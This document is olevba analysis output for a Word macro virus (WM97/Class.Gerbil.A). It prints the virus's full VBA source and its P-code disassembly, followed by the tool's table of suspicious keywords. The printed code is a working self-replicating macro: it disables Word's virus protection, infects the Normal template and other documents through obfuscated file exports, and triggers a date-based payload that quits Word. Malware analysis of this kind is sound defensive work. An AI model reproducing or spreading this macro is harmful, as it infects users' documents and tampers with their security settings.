olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 75

I = 0

Options.VirusProtection = Chr(48): cxr = 0: ox = 1: rc = 4: zz = 2

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

If Month(Now()) > 6 And Day(Now()) = 13 Then Call ©

gx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

xg = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.CountOfLines

If xg > 94 And gx > Abs(cxr) Then GoTo 75

If xg < 94 Then

 Set bg = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Name = bg.Name

 ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(71) + Chr(101) + Chr(114) + Chr(98) + Chr(105) + Chr(108) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If gx = Abs(cxr) Then Set bg = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1))))

 Infect = Int(Rnd * 50)

 If Infect = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

 bg.codemodule.AddFromFile Windows.Application.Path & Chr(71) + Chr(101) + Chr(114) + Chr(98) + Chr(105) + Chr(108) + Chr(46) + Chr(100) + Chr(108) + Chr(108)

 With bg.codemodule

    For j = Abs(ox) To Abs(rc)

    .deletelines Abs(ox)

    Next j

 End With
  
 If xg < 94 Then

    With bg.codemodule

    .replaceline Abs(ox), "Sub AutoClose()"

    .replaceline 99, "Sub ToolsMacro()"
       
    rd = Int(Rnd * 100)

If rd = 99 Then .replaceline 69, ".replaceline j, Chr(39) & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
    
End With

 End If

 With bg.codemodule

    For j = Abs(zz) To 96 Step Abs(zz)

    .replaceline j, Chr(39) & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow

    Next j

 End With

75:

 If xg > 94 And gx = Abs(cxr) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Private Sub ©()

Top:

I = I + 1

On Error Resume Next

Application.WindowState = wdWindowStateMinimize

Application.WindowState = wdWindowStateMaximize

If I < 10 Then GoTo Top

Application.Quit

End Sub

Sub ViewVBCode()

End Sub 'WM97/Class.Gerbil.A By Virus ;) Smile

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bf
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5302 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	OnError 75 
' Line #3:
' Line #4:
' 	LitDI2 0x0000 
' 	St I 
' Line #5:
' Line #6:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St cxr 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St ox 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	St rc 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St zz 
' Line #7:
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' Line #12:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Gt 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) © 0x0000 
' 	EndIf 
' Line #13:
' Line #14:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St gx 
' Line #15:
' Line #16:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xg 
' Line #17:
' Line #18:
' 	Ld xg 
' 	LitDI2 0x005E 
' 	Gt 
' 	Ld gx 
' 	Ld cxr 
' 	FnAbs 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 75 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld xg 
' 	LitDI2 0x005E 
' 	Lt 
' 	IfBlock 
' Line #21:
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bg 
' Line #23:
' Line #24:
' 	Ld bg 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' Line #26:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	Ld gx 
' 	Ld cxr 
' 	FnAbs 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bg 
' 	EndIf 
' Line #31:
' Line #32:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St Infect 
' Line #33:
' Line #34:
' 	Ld Infect 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #35:
' Line #36:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x0047 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld bg 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #37:
' Line #38:
' 	StartWithExpr 
' 	Ld bg 
' 	MemLd codemodule 
' 	With 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld ox 
' 	FnAbs 
' 	Ld rc 
' 	FnAbs 
' 	For 
' Line #41:
' Line #42:
' 	Ld ox 
' 	FnAbs 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' Line #46:
' 	EndWith 
' Line #47:
' Line #48:
' 	Ld xg 
' 	LitDI2 0x005E 
' 	Lt 
' 	IfBlock 
' Line #49:
' Line #50:
' 	StartWithExpr 
' 	Ld bg 
' 	MemLd codemodule 
' 	With 
' Line #51:
' Line #52:
' 	Ld ox 
' 	FnAbs 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #53:
' Line #54:
' 	LitDI2 0x0063 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #55:
' Line #56:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St rd 
' Line #57:
' Line #58:
' 	Ld rd 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0045 
' 	LitStr 0x008F ".replaceline j, Chr(39) & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #59:
' Line #60:
' 	EndWith 
' Line #61:
' Line #62:
' 	EndIfBlock 
' Line #63:
' Line #64:
' 	StartWithExpr 
' 	Ld bg 
' 	MemLd codemodule 
' 	With 
' Line #65:
' Line #66:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld zz 
' 	FnAbs 
' 	LitDI2 0x0060 
' 	Ld zz 
' 	FnAbs 
' 	ForStep 
' Line #67:
' Line #68:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #69:
' Line #70:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' Line #72:
' 	EndWith 
' Line #73:
' Line #74:
' 	LineNum 75 
' 	BoS 0x0000 
' Line #75:
' Line #76:
' 	Ld xg 
' 	LitDI2 0x005E 
' 	Gt 
' 	Ld gx 
' 	Ld cxr 
' 	FnAbs 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #77:
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' 	FuncDefn (Private Sub ©())
' Line #81:
' Line #82:
' 	Label Top 
' Line #83:
' Line #84:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #85:
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' Line #88:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #89:
' Line #90:
' 	Ld wdWindowStateMaximize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #91:
' Line #92:
' 	Ld I 
' 	LitDI2 0x000A 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo Top 
' 	EndIf 
' Line #93:
' Line #94:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #95:
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' Line #100:
' 	EndSub 
' 	QuoteRem 0x0008 0x0025 "WM97/Class.Gerbil.A By Virus ;) Smile"
' Line #101:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

